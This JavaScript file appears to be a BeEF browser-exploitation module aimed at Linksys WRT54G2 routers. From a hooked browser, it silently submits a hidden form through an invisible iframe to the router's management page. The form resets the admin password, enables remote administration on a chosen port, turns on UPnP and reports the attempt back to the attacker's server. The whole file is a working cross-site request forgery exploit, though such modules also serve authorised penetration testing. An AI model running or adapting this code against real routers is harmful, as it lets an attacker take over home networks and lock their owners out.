//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "Manage.tri";

  var wrt54g2_iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_USE_HTTP');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP_S');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORDMOD');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD_CONFIRM');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '_http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_WLFILTER');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_REMOTE');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PORT');
  input.setAttribute('value', port);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_UPNP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'layout');
  input.setAttribute('value', 'en');
  form.appendChild(input);

  wrt54g2_iframe.contentWindow.document.body.appendChild(form);
  form.submit();

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(wrt54g2_iframe);
  }
  setTimeout("cleanup()", 15000);

});

